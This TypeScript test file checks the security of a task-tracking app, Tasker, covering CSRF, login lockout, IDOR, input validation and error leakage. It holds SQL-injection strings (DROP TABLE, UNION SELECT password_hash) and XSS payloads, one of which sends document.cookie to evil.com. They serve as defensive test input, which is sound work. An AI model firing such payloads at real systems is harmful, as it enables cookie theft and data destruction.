/**
 * Security negative-test suite for Tasker.
 *
 * Covers:
 *  - Input validation & sanitization
 *  - CSRF protection
 *  - Authentication & access control (including IDOR)
 *  - SQL-injection attempts (parameterised queries)
 *  - XSS payload rejection / safe return
 *  - Resource exhaustion guards (oversized payloads)
 *  - Error handling (no stack-trace leakage)
 *  - Secrets / sensitive data not returned in responses
 */

import os from 'os';
import path from 'path';
import fs from 'fs';
import request from 'supertest';
import { buildTestApp, createAdminSession, createUserSession } from './helpers/testApp';
import { getDb, closeDb } from '../db';

// ── Test-DB isolation ─────────────────────────────────────────────────────────
const TEST_DB = path.join(os.tmpdir(), `tasker-test-${process.pid}.db`);
process.env['TASKER_DB_PATH'] = TEST_DB;

let app: ReturnType<typeof buildTestApp>;

beforeAll(() => {
  // Force fresh singleton against the temp DB
  closeDb();
  app = buildTestApp();
  getDb(); // initialise schema
});

afterAll(() => {
  closeDb();
  try { fs.unlinkSync(TEST_DB); } catch { /* ignore */ }
});

// Helper: fresh supertest agent per test (isolated cookie jar)
const agent = () => request.agent(app);

// ─────────────────────────────────────────────────────────────────────────────
// 1. CSRF PROTECTION
// ─────────────────────────────────────────────────────────────────────────────
describe('CSRF protection', () => {
  test('POST /api/auth/login without CSRF token → 403', async () => {
    const res = await agent()
      .post('/api/auth/login')
      .send({ username: 'x', password: 'y' });
    expect(res.status).toBe(403);
    expect(res.body.error).toMatch(/csrf/i);
  });

  test('POST /api/auth/login with wrong CSRF token → 403', async () => {
    const res = await agent()
      .post('/api/auth/login')
      .set('X-CSRF-Token', 'deadbeef')
      .send({ username: 'x', password: 'y' });
    expect(res.status).toBe(403);
  });

  test('Mutating task endpoint without CSRF token → 403', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    // Deliberately omit CSRF
    const res = await a.post('/api/tasks/start').send({ category: 'X', subcategory: 'Y' });
    expect(res.status).toBe(403);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 2. AUTHENTICATION
// ─────────────────────────────────────────────────────────────────────────────
describe('Authentication', () => {
  test('Accessing protected route without session → 401', async () => {
    const res = await agent().get('/api/tasks');
    expect(res.status).toBe(401);
  });

  test('Login with empty credentials → 400', async () => {
    const a = agent();
    const csrf = (await a.get('/api/auth/csrf-token')).body.token;
    const res = await a.post('/api/auth/login').set('X-CSRF-Token', csrf).send({});
    expect(res.status).toBe(400);
  });

  test('Login with wrong password → 401 (no stack trace)', async () => {
    const a = agent();
    const csrf = (await a.get('/api/auth/csrf-token')).body.token;
    const res = await a.post('/api/auth/login').set('X-CSRF-Token', csrf)
      .send({ username: 'nonexistent', password: 'wrongpassword' });
    expect(res.status).toBe(401);
    expect(JSON.stringify(res.body)).not.toMatch(/stack|Error:|at [A-Z]/);
  });

  test('Login response does NOT expose password_hash', async () => {
    const a = agent();
    const { username, password, csrf } = await createUserSession(a);
    // Log out then re-login
    await a.post('/api/auth/logout').set('X-CSRF-Token', csrf).send({});
    const csrf2 = (await a.get('/api/auth/csrf-token')).body.token;
    const res = await a.post('/api/auth/login').set('X-CSRF-Token', csrf2)
      .send({ username, password });
    expect(JSON.stringify(res.body)).not.toMatch(/password_hash|hash/i);
  });

  test('Account lockout after 3 failed attempts', async () => {
    const a = agent();
    const pw = 'LockoutP@ss!';
    const bcrypt = require('bcryptjs');
    const hash = await bcrypt.hash(pw, 4);
    const uname = 'lockout_' + Math.random().toString(36).slice(2);
    getDb().prepare('INSERT INTO users (username,password_hash,is_approved) VALUES (?,?,1)').run(uname, hash);

    for (let i = 0; i < 3; i++) {
      const csrf = (await a.get('/api/auth/csrf-token')).body.token;
      await a.post('/api/auth/login').set('X-CSRF-Token', csrf).send({ username: uname, password: 'WRONG!' });
    }

    // 4th attempt — even with correct password — should be locked
    const csrf = (await a.get('/api/auth/csrf-token')).body.token;
    const res = await a.post('/api/auth/login').set('X-CSRF-Token', csrf).send({ username: uname, password: pw });
    expect(res.status).toBe(403);
    expect(res.body.error).toMatch(/lock/i);
  });

  test('Session-only endpoint returns 401 after logout', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    await a.post('/api/auth/logout').set('X-CSRF-Token', csrf).send({});
    const res = await a.get('/api/tasks');
    expect(res.status).toBe(401);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 3. ACCESS CONTROL / BROKEN ACCESS CONTROL (IDOR)
// ─────────────────────────────────────────────────────────────────────────────
describe('Access control', () => {
  test('Admin endpoint denied for non-admin user', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.get('/api/admin/users').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(403);
  });

  test('User cannot read another user\'s task (IDOR)', async () => {
    const a1 = agent();
    const a2 = agent();
    const { csrf: csrf1 } = await createUserSession(a1);
    const { csrf: csrf2 } = await createUserSession(a2);

    // user1 starts a task
    const startRes = await a1.post('/api/tasks/start').set('X-CSRF-Token', csrf1).send({
      category: 'Clinical', subcategory: 'Handover',
      start_time: new Date().toISOString(), assigned_date: new Date().toISOString().split('T')[0],
    });
    expect(startRes.status).toBe(200);
    const taskId = startRes.body.taskId;

    // user2 tries to read it
    const res = await a2.get(`/api/tasks/${taskId}`).set('X-CSRF-Token', csrf2);
    expect(res.status).toBe(404);
  });

  test('User cannot patch another user\'s task (IDOR)', async () => {
    const a1 = agent();
    const a2 = agent();
    const { csrf: csrf1 } = await createUserSession(a1);
    const { csrf: csrf2 } = await createUserSession(a2);

    // user1 starts a task
    await a1.post('/api/tasks/start').set('X-CSRF-Token', csrf1).send({
      category: 'Clinical', subcategory: 'Handover',
      start_time: new Date().toISOString(), assigned_date: new Date().toISOString().split('T')[0],
    });
    // get the task id via user1
    const tasks = await a1.get('/api/tasks?status=in_progress').set('X-CSRF-Token', csrf1);
    const taskId = tasks.body.tasks[0]?.id;

    // user2 tries to PATCH it
    const res = await a2.patch(`/api/tasks/${taskId}`)
      .set('X-CSRF-Token', csrf2)
      .send({ status: 'completed', outcome: 'Completed', end_time: new Date().toISOString() });
    expect(res.status).toBe(404);
  });

  test('User cannot delete another user\'s task (IDOR)', async () => {
    const a1 = agent();
    const a2 = agent();
    const { csrf: csrf1 } = await createUserSession(a1);
    const { csrf: csrf2 } = await createUserSession(a2);

    await a1.post('/api/tasks/start').set('X-CSRF-Token', csrf1).send({
      category: 'Clinical', subcategory: 'Handover',
      start_time: new Date().toISOString(), assigned_date: new Date().toISOString().split('T')[0],
    });
    const tasks = await a1.get('/api/tasks').set('X-CSRF-Token', csrf1);
    const taskId = tasks.body.tasks[0]?.id;

    const res = await a2.delete(`/api/tasks/${taskId}`).set('X-CSRF-Token', csrf2);
    expect(res.status).toBe(404);
  });

  test('Admin cannot delete another admin account', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    // Attempt to delete a non-existent or admin user
    const res = await a.delete('/api/admin/users/99999').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(404);
  });

  test('Admin: cannot approve non-existent pending user', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.post('/api/admin/users/99999/approve').set('X-CSRF-Token', csrf).send({});
    expect(res.status).toBe(404);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 4. INPUT VALIDATION
// ─────────────────────────────────────────────────────────────────────────────
describe('Input validation', () => {
  test('Registration: weak password rejected', async () => {
    const a = agent();
    const csrf = (await a.get('/api/auth/csrf-token')).body.token;
    // Enable self-registration for this test
    getDb().prepare('INSERT OR REPLACE INTO settings (key,value) VALUES (?,?)').run('self_registration', 'auto');
    const res = await a.post('/api/auth/register').set('X-CSRF-Token', csrf).send({ password: 'weak' });
    expect(res.status).toBe(400);
    getDb().prepare('INSERT OR REPLACE INTO settings (key,value) VALUES (?,?)').run('self_registration', 'admin_approved');
  });

  test('Registration: password with no special chars rejected', async () => {
    const a = agent();
    const csrf = (await a.get('/api/auth/csrf-token')).body.token;
    getDb().prepare('INSERT OR REPLACE INTO settings (key,value) VALUES (?,?)').run('self_registration', 'auto');
    const res = await a.post('/api/auth/register').set('X-CSRF-Token', csrf).send({ password: 'Password123' });
    expect(res.status).toBe(400);
    getDb().prepare('INSERT OR REPLACE INTO settings (key,value) VALUES (?,?)').run('self_registration', 'admin_approved');
  });

  test('Change-password: new password same as current → reuses same weak hash check', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    // Very short password
    const res = await a.post('/api/auth/change-password')
      .set('X-CSRF-Token', csrf)
      .send({ currentPassword: 'UserP@ss1!', newPassword: 'short' });
    expect(res.status).toBe(400);
  });

  test('Task start: missing category/subcategory does not crash server', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/tasks/start')
      .set('X-CSRF-Token', csrf)
      .send({ start_time: new Date().toISOString(), assigned_date: new Date().toISOString().split('T')[0] });
    // Server should respond (200 with null category is acceptable; main thing = no 500)
    expect(res.status).not.toBe(500);
  });

  test('Task start: start_time in the past rejected', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/tasks/start')
      .set('X-CSRF-Token', csrf)
      .send({
        category: 'Clinical', subcategory: 'Handover',
        start_time: '2000-01-01T00:00:00.000Z',
        assigned_date: new Date().toISOString().split('T')[0],
      });
    expect(res.status).toBe(400);
    expect(res.body.error).toMatch(/today/i);
  });

  test('Task start: notes over 2000 chars rejected', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/tasks/start')
      .set('X-CSRF-Token', csrf)
      .send({
        category: 'Clinical', subcategory: 'Handover',
        start_time: new Date().toISOString(),
        assigned_date: new Date().toISOString().split('T')[0],
        notes: 'A'.repeat(2001),
      });
    expect(res.status).toBe(400);
    expect(res.body.error).toMatch(/2000/);
  });

  test('Pending-count: non-numeric count → 400', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/tasks/pending-count')
      .set('X-CSRF-Token', csrf)
      .send({ count: 'abc' });
    expect(res.status).toBe(400);
  });

  test('Pending-count: negative value → 400', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/tasks/pending-count')
      .set('X-CSRF-Token', csrf)
      .send({ count: -1 });
    expect(res.status).toBe(400);
  });

  test('Pending-count: excessively large value → 400', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/tasks/pending-count')
      .set('X-CSRF-Token', csrf)
      .send({ count: 99999 });
    expect(res.status).toBe(400);
  });

  test('Admin settings: invalid mode rejected', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.post('/api/admin/settings')
      .set('X-CSRF-Token', csrf)
      .send({ selfRegistration: 'evil_value', userInvite: 'admin_approved' });
    expect(res.status).toBe(400);
  });

  test('Dropdown propose: invalid field_name rejected', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/dropdowns/propose')
      .set('X-CSRF-Token', csrf)
      .send({ field_name: 'not_a_field', value: 'Test' });
    expect(res.status).toBe(400);
  });

  test('Dropdown propose: value over 100 chars rejected', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/dropdowns/propose')
      .set('X-CSRF-Token', csrf)
      .send({ field_name: 'category', value: 'A'.repeat(101) });
    expect(res.status).toBe(400);
  });

  test('Group proposal: empty name rejected', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/auth/propose-group')
      .set('X-CSRF-Token', csrf)
      .send({ name: '' });
    expect(res.status).toBe(400);
  });

  test('Group proposal: name over 100 chars rejected', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/auth/propose-group')
      .set('X-CSRF-Token', csrf)
      .send({ name: 'G'.repeat(101) });
    expect(res.status).toBe(400);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 5. SQL INJECTION ATTEMPTS
// ─────────────────────────────────────────────────────────────────────────────
describe('SQL injection', () => {
  const injections = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "\" OR \"1\"=\"1",
    "1; SELECT * FROM users; --",
    "' UNION SELECT password_hash FROM users --",
    "admin'--",
  ];

  test.each(injections)('Login username SQLi: %s → 401 (no crash)', async (payload) => {
    const a = agent();
    const csrf = (await a.get('/api/auth/csrf-token')).body.token;
    const res = await a.post('/api/auth/login')
      .set('X-CSRF-Token', csrf)
      .send({ username: payload, password: 'anypassword' });
    // Should not crash (500) and should not inadvertently succeed (200)
    expect(res.status).not.toBe(500);
    expect(res.status).not.toBe(200);
  });

  test('Task category SQLi payload stored safely', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    // Attempt to inject via category field
    const res = await a.post('/api/tasks/start')
      .set('X-CSRF-Token', csrf)
      .send({
        category: "Clinical'; DROP TABLE tasks; --",
        subcategory: 'Handover',
        start_time: new Date().toISOString(),
        assigned_date: new Date().toISOString().split('T')[0],
      });
    expect(res.status).not.toBe(500);
    // DB tables should still be intact
    expect(() => getDb().prepare('SELECT COUNT(*) FROM tasks').get()).not.toThrow();
  });

  test('Dropdown propose SQLi payload rejected or stored safely', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/dropdowns/propose')
      .set('X-CSRF-Token', csrf)
      .send({ field_name: 'category', value: "'; DROP TABLE dropdown_options; --" });
    expect(res.status).not.toBe(500);
    // Table must still exist
    expect(() => getDb().prepare('SELECT COUNT(*) FROM dropdown_options').get()).not.toThrow();
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 6. XSS PAYLOADS — server must not execute them; responses safe
// ─────────────────────────────────────────────────────────────────────────────
describe('XSS payloads', () => {
  const xssPayloads = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert('xss')",
    '<svg onload=alert(1)>',
  ];

  test.each(xssPayloads)('Dropdown proposal with XSS payload stored/rejected safely: %s', async (payload) => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/dropdowns/propose')
      .set('X-CSRF-Token', csrf)
      .send({ field_name: 'outcome', value: payload.substring(0, 100) });
    // Either rejected (value too long if >100 chars) or accepted as plain text
    expect(res.status).not.toBe(500);
    // The payload must not appear in a JSON body as executable HTML
    if (res.status === 200 && res.body.value) {
      // Content-Type should be JSON, not HTML
      expect(res.headers['content-type']).toMatch(/application\/json/);
    }
  });

  test('Task notes with XSS payload: server does not execute it', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const xssNote = '<script>fetch("https://evil.com/"+document.cookie)</script>';
    const res = await a.post('/api/tasks/start')
      .set('X-CSRF-Token', csrf)
      .send({
        category: 'Clinical', subcategory: 'Handover', notes: xssNote,
        start_time: new Date().toISOString(),
        assigned_date: new Date().toISOString().split('T')[0],
      });
    expect(res.status).not.toBe(500);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 7. RESOURCE EXHAUSTION
// ─────────────────────────────────────────────────────────────────────────────
describe('Resource exhaustion', () => {
  test('Oversized JSON body rejected (>1MB)', async () => {
    const a = agent();
    const csrf = (await a.get('/api/auth/csrf-token')).body.token;
    // Build a body well over 1 MB so express.json({ limit:'1mb' }) rejects it with 413
    const bigString = 'x'.repeat(600_000);
    const res = await a.post('/api/auth/login')
      .set('X-CSRF-Token', csrf)
      .set('Content-Type', 'application/json')
      .send(JSON.stringify({ username: bigString, password: bigString }));
    // express.json limit returns 413; route may also return 400/403; never 500
    expect(res.status).toBe(413);
  });

  test('Starting a second active task returns 409 (not 500)', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const payload = {
      category: 'Clinical', subcategory: 'Handover',
      start_time: new Date().toISOString(), assigned_date: new Date().toISOString().split('T')[0],
    };
    await a.post('/api/tasks/start').set('X-CSRF-Token', csrf).send(payload);
    const res = await a.post('/api/tasks/start').set('X-CSRF-Token', csrf).send(payload);
    expect(res.status).toBe(409);
    expect(res.body.error).toMatch(/active/i);
  });

  test('Option IDs array: non-array value rejected', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.put('/api/auth/my-options')
      .set('X-CSRF-Token', csrf)
      .send({ option_ids: 'not-an-array' });
    expect(res.status).toBe(400);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 8. ERROR HANDLING — no stack traces or system info leaked
// ─────────────────────────────────────────────────────────────────────────────
describe('Error handling', () => {
  test('404 on non-existent API route does not leak stack trace', async () => {
    const res = await agent().get('/api/nonexistent/route');
    expect(JSON.stringify(res.body)).not.toMatch(/at Object\.|at Module\.|node_modules/);
  });

  test('404 task request returns JSON error, not stack trace', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.get('/api/tasks/99999999').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(404);
    expect(JSON.stringify(res.body)).not.toMatch(/at Object\.|Error:/);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 9. TEMPORAL CONSISTENCY
// ─────────────────────────────────────────────────────────────────────────────
describe('Temporal consistency checks', () => {
  test('Task PATCH: end_time before start_time → 400', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const now = new Date();
    const earlier = new Date(now.getTime() - 60_000);

    const startRes = await a.post('/api/tasks/start')
      .set('X-CSRF-Token', csrf)
      .send({
        category: 'Clinical', subcategory: 'Handover',
        start_time: now.toISOString(),
        assigned_date: now.toISOString().split('T')[0],
      });
    const taskId = startRes.body.taskId;

    const patchRes = await a.patch(`/api/tasks/${taskId}`)
      .set('X-CSRF-Token', csrf)
      .send({
        status: 'completed',
        outcome: 'Completed',
        start_time: now.toISOString(),
        end_time: earlier.toISOString(),
      });
    expect(patchRes.status).toBe(400);
    expect(patchRes.body.error).toMatch(/start time must be before/i);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 10. PATH TRAVERSAL (admin restore)
// ─────────────────────────────────────────────────────────────────────────────
describe('Path traversal', () => {
  test('Admin restore with no file → 400', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.post('/api/admin/restore')
      .set('X-CSRF-Token', csrf)
      .send({});
    expect(res.status).toBe(400);
    expect(res.body.error).toMatch(/no file/i);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 11. GROUP ACCESS CONTROL
// ─────────────────────────────────────────────────────────────────────────────
describe('Group access control', () => {
  test('User cannot set group to a pending (unapproved) group', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    // Insert a pending group directly
    const db = getDb();
    const r = db.prepare('INSERT INTO user_groups (name, is_approved) VALUES (?,0)').run('PendingGroup_' + Date.now());
    const pendingId = r.lastInsertRowid;

    const res = await a.post('/api/auth/set-group')
      .set('X-CSRF-Token', csrf)
      .send({ groupId: pendingId });
    expect(res.status).toBe(400);
    expect(res.body.error).toMatch(/not found/i);
  });

  test('Non-admin cannot access pending groups list', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.get('/api/admin/pending-groups').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(403);
  });

  test('Non-admin cannot approve pending groups', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/admin/pending-groups/1/approve')
      .set('X-CSRF-Token', csrf).send({});
    expect(res.status).toBe(403);
  });
});
